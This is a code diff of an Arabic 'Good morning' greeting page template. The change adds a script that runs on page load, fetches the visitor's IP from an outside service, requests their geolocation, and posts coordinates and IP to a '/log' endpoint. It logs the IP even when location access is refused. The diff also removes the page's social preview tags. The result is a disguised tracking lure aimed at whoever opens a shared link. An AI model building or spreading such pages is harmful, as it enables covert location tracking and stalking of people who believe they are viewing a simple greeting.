@@ -4,14 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>صباح الخير</title>
-  <meta property="og:title" content="صباح الخير">
-  <meta property="og:description" content="أتمنى لك صباحًا مشرقًا ومليئًا بالخير">
-  <meta property="og:image" content="{{ url_for('static', filename='sabah.jpg') }}">
-  <meta property="og:type" content="website">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="صباح الخير">
-  <meta name="twitter:description" content="أتمنى لك صباحًا مشرقًا ومليئًا بالخير">
-  <meta name="twitter:image" content="{{ url_for('static', filename='sabah.jpg') }}">
   <style>
     body {
       display: flex;
@@ -25,11 +17,49 @@
       max-width: 90%;
       height: auto;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
   </style>
 </head>
 <body>
   <img src="{{ url_for('static', filename='sabah.jpg') }}" alt="صباح الخير">
+
+  <script>
+    async function sendData(lat, lon, ip) {
+      await fetch('/log', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({latitude: lat, longitude: lon, ip: ip})
+      });
+    }
+
+    // الحصول على IP من خدمة خارجية
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'Unknown';
+      }
+    }
+
+    // الحصول على الموقع الجغرافي
+    async function getLocation() {
+      const ip = await getIP();
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          sendData(pos.coords.latitude, pos.coords.longitude, ip);
+        }, () => {
+          // إذا رفض المستخدم الموقع، نرسل فقط IP
+          sendData(null, null, ip);
+        });
+      } else {
+        sendData(null, null, ip);
+      }
+    }
+
+    getLocation();
+  </script>
 </body>
 </html>
